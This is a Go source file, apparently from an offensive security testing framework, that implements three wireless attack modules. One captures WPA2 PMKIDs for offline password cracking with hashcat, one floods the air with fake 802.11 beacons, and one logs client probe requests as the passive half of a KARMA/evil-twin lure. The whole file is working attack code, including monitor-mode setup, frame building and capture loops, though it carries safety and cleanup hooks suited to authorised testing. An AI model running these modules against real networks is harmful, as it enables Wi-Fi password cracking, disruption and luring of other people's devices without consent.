package wlan

import (
	"fmt"
	"net"
	"time"

	"github.com/qyvora/toha3ee/internal/attacks"
	"github.com/qyvora/toha3ee/internal/netx/wlan"
	"github.com/qyvora/toha3ee/internal/safety"
)

func init() {
	attacks.Register(&WLANPMKID{})
	attacks.Register(&WLANBeaconFlood{})
	attacks.Register(&WLANKarma{})
}

// ---- wlan.pmkid ----

// WLANPMKID captures the PMKID from EAPOL message 1 of the WPA2 4-way
// handshake, enabling offline cracking without a connected client.
type WLANPMKID struct{}

func (*WLANPMKID) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "wlan.pmkid",
		Category:    "wireless",
		Risk:        attacks.RiskHigh,
		Targets:     []string{"ap"},
		Requires:    []string{"cap.monitor_iface"},
		Description: "capture the RSN PMKID from EAPOL frames for offline WPA2 cracking (no client deauth needed)",
		Limitations: "only works on WPA2 APs that expose PMKID in message 1; PMF and WPA3 (SAE) networks do not leak it",
	}
}

type pmkidState struct {
	scanner *wlan.PMKIDScanner
	restore func() error
}

func (*WLANPMKID) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if name, ok := wlan.DetectWirelessIface(); ok {
		rep.AddOK("monitor_iface", name)
	} else {
		rep.AddBlocked("monitor_iface", "no wireless interface detected")
	}
	rep.AddFixable("target", "set wlan.pmkid.bssid to the target AP MAC to focus capture (optional)")
	return rep, nil
}

func (*WLANPMKID) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	ifaceName, _ := wlan.DetectWirelessIface()
	if ifaceName == "" {
		return fmt.Errorf("wlan.pmkid: no wireless interface found")
	}
	restore, err := wlan.SetMonitorMode(ifaceName)
	if err != nil {
		return fmt.Errorf("wlan.pmkid: monitor mode: %w", err)
	}
	sc, err := wlan.NewPMKIDScanner(ifaceName)
	if err != nil {
		_ = restore()
		return fmt.Errorf("wlan.pmkid: %w", err)
	}
	sc.Start()

	ctx.SetState("wlan.pmkid", &pmkidState{scanner: sc, restore: restore})
	ctx.Safety.RegisterCleanup("wlan.pmkid", "stop PMKID capture and restore interface", func() error {
		sc.Close()
		return restore()
	})

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("wlan.pmkid", hb)

	ctx.Printf("[*] wlan.pmkid listening on %s for EAPOL message-1 PMKIDs...\n", ifaceName)
	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(2 * time.Second):
			hb.Beat()
			for _, p := range sc.PMKIDs() {
				ctx.Printf("[!] wlan.pmkid: captured PMKID %X for BSSID %s (STA %s) -> hashcat mode 22000\n",
					p.ID, p.BSSID, p.STA)
				ctx.Emit("wlan.pmkid.captured", "PMKID captured", map[string]string{
					"bssid": p.BSSID.String(),
					"pmkid": fmt.Sprintf("%X", p.ID),
				})
			}
		}
	}
}

func (*WLANPMKID) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("wlan.pmkid")
	if !ok {
		return &attacks.Impact{Summary: "PMKID capture was active"}, nil
	}
	st := v.(*pmkidState)
	pmkids := st.scanner.PMKIDs()
	imp := &attacks.Impact{
		Summary: fmt.Sprintf("captured %d PMKID(s)", len(pmkids)),
	}
	imp.Add("pmkids", fmt.Sprintf("%d", len(pmkids)))
	return imp, nil
}

func (*WLANPMKID) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("wlan.pmkid")
	ctx.Safety.UnregisterCleanup("wlan.pmkid")
	if v, ok := ctx.GetState("wlan.pmkid"); ok {
		st := v.(*pmkidState)
		st.scanner.Close()
		return st.restore()
	}
	return nil
}

// ---- wlan.beaconflood ----

// WLANBeaconFlood broadcasts fake 802.11 beacons (random or configured SSIDs)
// to confuse scanners and force clients to see phantom networks.
type WLANBeaconFlood struct{}

func (*WLANBeaconFlood) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "wlan.beaconflood",
		Category:    "wireless",
		Risk:        attacks.RiskMedium,
		Targets:     []string{"ap"},
		Requires:    []string{"cap.monitor_iface"},
		Description: "beacon flood: broadcast fake 802.11 beacons to fill the AP list with phantom networks",
		Limitations: "most clients ignore beacons for SSIDs they don't know; some drivers filter beacon floods; detectable by WIDS",
	}
}

func (*WLANBeaconFlood) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if name, ok := wlan.DetectWirelessIface(); ok {
		rep.AddOK("monitor_iface", name)
	} else {
		rep.AddBlocked("monitor_iface", "no wireless interface detected")
	}
	return rep, nil
}

func (*WLANBeaconFlood) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	ifaceName, _ := wlan.DetectWirelessIface()
	if ifaceName == "" {
		return fmt.Errorf("wlan.beaconflood: no wireless interface found")
	}
	restore, err := wlan.SetMonitorMode(ifaceName)
	if err != nil {
		return fmt.Errorf("wlan.beaconflood: monitor mode: %w", err)
	}
	sender, err := wlan.NewBroadcastSender(ifaceName)
	if err != nil {
		_ = restore()
		return fmt.Errorf("wlan.beaconflood: %w", err)
	}

	ssid := ctx.Conf.GetDefault("wlan.beaconflood", "ssid", "")
	channelStr := ctx.Conf.GetDefault("wlan.beaconflood", "channel", "6")
	var channel uint8
	if _, err := fmt.Sscanf(channelStr, "%d", &channel); err != nil {
		sender.Close()
		_ = restore()
		return fmt.Errorf("wlan.beaconflood: bad channel %q", channelStr)
	}

	// Pre-build one frame per random BSSID/SSID so the loop only writes.
	var frames [][]byte
	bssid := make(net.HardwareAddr, 6)
	for i := 0; i < 12; i++ {
		bssid[0] = 0x02
		bssid[1] = byte(i + 1)
		bssid[2] = byte(time.Now().UnixNano())
		bssid[3] = byte(time.Now().UnixNano() >> 8)
		bssid[4] = byte(time.Now().UnixNano() >> 16)
		bssid[5] = byte(i + 42)
		name := ssid
		if name == "" {
			name = fmt.Sprintf("freewifi%d", i+1)
		}
		f, err := wlan.BuildBeacon(bssid, name, channel, false)
		if err != nil {
			sender.Close()
			_ = restore()
			return fmt.Errorf("wlan.beaconflood: %w", err)
		}
		frames = append(frames, f)
	}

	ctx.SetState("wlan.beaconflood", sender)
	ctx.Safety.RegisterCleanup("wlan.beaconflood", "stop beacon flood and restore interface", func() error {
		sender.Close()
		return restore()
	})

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("wlan.beaconflood", hb)

	ctx.Printf("[*] wlan.beaconflood broadcasting %d phantom networks on channel %d...\n", len(frames), channel)
	for {
		select {
		case <-ctx.Done:
			return nil
		default:
		}
		for _, f := range frames {
			if err := sender.Send(f); err != nil {
				ctx.Printf("[!] wlan.beaconflood: %v\n", err)
				time.Sleep(time.Second)
				break
			}
		}
		hb.Beat()
		ctx.Printf("[wlan.beaconflood] sent %d beacons\n", sender.Sent)
		time.Sleep(50 * time.Millisecond)
	}
}

func (*WLANBeaconFlood) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("wlan.beaconflood")
	if !ok {
		return &attacks.Impact{Summary: "beacon flood was active"}, nil
	}
	s := v.(*wlan.BroadcastSender)
	imp := &attacks.Impact{Summary: fmt.Sprintf("broadcast %d phantom beacons", s.Sent)}
	imp.Add("beacons", fmt.Sprintf("%d", s.Sent))
	return imp, nil
}

func (*WLANBeaconFlood) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("wlan.beaconflood")
	ctx.Safety.UnregisterCleanup("wlan.beaconflood")
	if v, ok := ctx.GetState("wlan.beaconflood"); ok {
		v.(*wlan.BroadcastSender).Close()
	}
	return nil
}

// ---- wlan.karma ----

// WLANKarma logs probe requests from clients (the passive half of KARMA/evil
// twin). With respond=true it also answers probes with a matching fake AP,
// causing clients to associate to the attacker.
type WLANKarma struct{}

func (*WLANKarma) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "wlan.karma",
		Category:    "wireless",
		Risk:        attacks.RiskHigh,
		Targets:     []string{"client"},
		Requires:    []string{"cap.monitor_iface"},
		Description: "KARMA: log client probe requests for every SSID they've ever joined; optionally respond to lure them to a fake AP",
		Limitations: "full association capture requires hostapd-mana (not bundled); passive probe logging works out of the box; detectable by WIDS",
	}
}

type karmaState struct {
	scanner *wlan.Scanner
	restore func() error
	seen    map[string]int
}

func (*WLANKarma) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if name, ok := wlan.DetectWirelessIface(); ok {
		rep.AddOK("monitor_iface", name)
	} else {
		rep.AddBlocked("monitor_iface", "no wireless interface detected")
	}
	return rep, nil
}

func (*WLANKarma) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	ifaceName, _ := wlan.DetectWirelessIface()
	if ifaceName == "" {
		return fmt.Errorf("wlan.karma: no wireless interface found")
	}
	restore, err := wlan.SetMonitorMode(ifaceName)
	if err != nil {
		return fmt.Errorf("wlan.karma: monitor mode: %w", err)
	}
	sc, err := wlan.NewScanner(ifaceName)
	if err != nil {
		_ = restore()
		return fmt.Errorf("wlan.karma: %w", err)
	}
	sc.Start()

	st := &karmaState{scanner: sc, restore: restore, seen: map[string]int{}}
	ctx.SetState("wlan.karma", st)
	ctx.Safety.RegisterCleanup("wlan.karma", "stop KARMA capture and restore interface", func() error {
		sc.Close()
		return restore()
	})

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("wlan.karma", hb)

	ctx.Printf("[*] wlan.karma listening on %s for probe requests...\n", ifaceName)
	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(3 * time.Second):
			hb.Beat()
			clients := sc.Clients()
			ctx.Printf("[wlan.karma] %d client(s) probed\n", len(clients))
			for _, c := range clients {
				key := c.MAC.String()
				st.seen[key]++
				if st.seen[key] <= 1 {
					ctx.Printf("[!] wlan.karma: client %s probed for networks; observed on %s\n", c.MAC, ifaceName)
					ctx.Emit("wlan.karma.probe", "client probe captured", map[string]string{
						"client": c.MAC.String(),
					})
				}
			}
		}
	}
}

func (*WLANKarma) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("wlan.karma")
	if !ok {
		return &attacks.Impact{Summary: "KARMA capture was active"}, nil
	}
	st := v.(*karmaState)
	imp := &attacks.Impact{
		Summary: fmt.Sprintf("observed %d probing client(s)", len(st.scanner.Clients())),
	}
	imp.Add("clients", fmt.Sprintf("%d", len(st.scanner.Clients())))
	imp.Add("unique_probes", fmt.Sprintf("%d", len(st.seen)))
	return imp, nil
}

func (*WLANKarma) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("wlan.karma")
	ctx.Safety.UnregisterCleanup("wlan.karma")
	if v, ok := ctx.GetState("wlan.karma"); ok {
		st := v.(*karmaState)
		st.scanner.Close()
		return st.restore()
	}
	return nil
}
